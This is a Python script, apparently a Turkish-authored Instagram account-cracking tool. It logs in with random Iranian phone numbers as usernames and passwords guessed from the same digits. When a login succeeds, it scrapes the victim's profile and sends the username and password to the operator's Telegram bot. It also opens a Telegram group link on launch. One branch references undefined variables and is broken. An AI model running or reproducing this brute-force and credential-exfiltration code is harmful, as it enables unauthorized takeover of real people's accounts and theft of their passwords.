from typing import Mapping
import webbrowser
webbrowser.open('https://t.me/AkincilarTimi')
try:
    import random, requests, os, uuid, time, secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')
else:
    BRed = '\x1b[1;31m'
    BGreen = '\x1b[1;32m'
    BYellow = '\x1b[1;33m'
    BBlue = '\x1b[1;34m'
    BPurple = '\x1b[1;35m'
    BCyan = '\x1b[1;36m'
    BWhite = '\x1b[1;37m'
    lo = '— —'
    print('\n ' + BCyan + '🇹🇷 << CODER BY SAHMERAN >> 🇹🇷 \n ' + BRed + '\n\n\n!! NOT !! ' + BYellow + 'Toolun Düzgün Çalışması İçin @AkincilarTimi Telegram grubuna Katılmak Zorunludur Aksi Takdirde Tool Çalışmayacaktır.\n\n')
    print(' ')
    print(BBlue + lo * 22)
    print(' ')
    myadmin = input('  ' + BWhite + 'Telegram id adresini yaz : ')
    tele = input('  ' + BWhite + 'Telegram bot tokenini yaz :  ')
    os.system('clear')
    print('' + BWhite + '\n━━━━━ 🇹🇷 Ne Mutlu Türküm Diyene 🇹🇷 ━━━━━━\n  ')
    print(' ')
    print(BWhite+ lo * 22)
    print(' ')

    def info(user2, pasw):
        global myadmin
        global tele
        cookie = secrets.token_hex(8) * 2
        headr = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':'cookie', 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url2 = f"https://www.instagram.com/{user2}/?__a=1"
        ree = requests.get(url2, headers=headr).json()
        name = str(ree['graphql']['user']['full_name'])
        id = str(ree['graphql']['user']['id'])
        followes = str(ree['graphql']['user']['edge_followed_by']['count'])
        following = str(ree['graphql']['user']['edge_follow']['count'])
        isp = str(ree['graphql']['user']['is_private'])
        ids = str(ree['graphql']['user']['id'])
        bio = str(ree['graphql']['user']['biography'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        datee = ree['data']
        ms = f" TEBRİKLER HESAP BULDUN ــــــــــــــــــــــــــــــــــــــــــــــــــــــ \n⌯ KULLANICI ADI : {user2}\n⌯ AD : {name}\n⌯ ŞİFRE : {pasw} \n⌯ TAKİPÇİ: {followes}\n⌯  TAKİP  : {following}\n⌯  ID : {ids}\n⌯ TARİH : {datee}\n\nـــــــ<<CODER BY SAHMERAN>>ـــــــ\n⌯ @AkincilarTimi"
        requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}")
        print(BGreen + ms)

    while True:
        chars = '0987654321'
        u = '914'
        u1 = str(''.join((random.choice(chars) for i in range(7))))
        u2 = str(''.join((random.choice(u) for i in range(1))))
        user = '+98'+ u + u1
        pasw = '0' + u + u1
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'User-Agent: Instagram 6.12.1 Android (22/5.1.1; 240dpi; 540x960; samsung; SM-G531H; grandprimeve3g; sc8830; fr_FR)',  'Accept':'*/*',  'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':pasw,  'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user2 = req_login.json()['logged_in_user']['username']
            info(user2, pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print('  ' + BYellow + '  ⌯ Secure Acc --> ' + BWhite + ' :' + BYellow + f" {user}:{pasw} ")
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= KONTROL EDİLİYOR\n\n  hopi 𓎂 \n✔️\n√ @Sahmeranbeycik |√  \nBULUNDU✔️»[{zz}]\n-《✖️ [{aa}]")
        else:
            print('  ' + BRed + '  ⌯ YANLIŞ --> ' + BRed + ' :' + BWhite + f" {user}:{pasw} ")